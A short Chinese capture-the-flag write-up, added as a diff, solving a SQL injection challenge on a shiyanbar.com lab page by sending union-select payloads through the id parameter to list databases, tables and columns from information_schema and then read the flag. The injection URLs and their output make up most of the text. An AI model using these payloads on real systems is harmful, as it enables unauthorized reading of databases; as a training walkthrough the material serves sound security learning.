@@ -1,0 +1,47 @@
+
+
+测试id是否为注入点，发现，是存在注入点的
+
+提交
+
+http://ctf5.shiyanbar.com/8/index.php?id=1 union select 1,1
+
+ID 	content
+1 	Welcome to This Game!Enjoy~~~
+1 	1
+
+现在要做的就是猜表名和字段名
+
+可以首先看看数据库名
+
+http://ctf5.shiyanbar.com/8/index.php?id=1 union select 1,SCHEMA_NAME from information_schema.SCHEMATA
+
+ID 	content
+1 	Welcome to This Game!Enjoy~~~
+1 	information_schema
+1 	my_db
+
+然后就是猜表名
+
+http://ctf5.shiyanbar.com/8/index.php?id=1 union select 1,TABLE_NAME from information_schema.TABLES
+
+发现 thiskey 表名是可疑的
+
+
+猜字段名
+
+http://ctf5.shiyanbar.com/8/index.php?id=1 union select 1,COLUMN_NAME from information_schema.COLUMNS
+
+发现 k0y 字段名是可疑的
+
+
+于是提交
+
+http://ctf5.shiyanbar.com/8/index.php?id=1 union select 1,k0y from thiskey
+
+得到
+
+ID 	content
+1 	Welcome to This Game!Enjoy~~~
+1 	flag
+
